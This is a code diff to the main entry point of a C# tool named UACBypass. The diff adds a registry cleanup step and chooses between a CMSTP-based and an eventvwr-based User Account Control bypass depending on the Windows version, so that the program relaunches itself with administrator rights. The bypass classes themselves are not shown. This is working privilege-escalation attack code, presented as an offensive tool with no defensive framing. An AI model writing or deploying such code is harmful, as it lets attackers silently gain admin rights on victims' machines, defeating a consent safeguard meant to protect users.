@@ -10,6 +10,8 @@ namespace UACBypass
     {
         static void Main(string[] args)
         {
+            EVENTVWRBypass.CleanRegistry();
+
             Console.WriteLine("running as admin? " + (Win32.IsRunAsAdmin() ? "yes" : "no"));
             Console.WriteLine("running as system? " + (Win32.IsRunAsSystem() ? "yes" : "no"));
 
@@ -19,7 +21,9 @@ namespace UACBypass
                 Console.WriteLine("Bypassing UAC....");
 
                 //make a privilege escalation to get admin rights
-                CMSTPBypass.autoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                if(OsSupport.IsTenOrBetter)
+                    CMSTPBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                else EVENTVWRBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
             }
             else if(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem)
             {
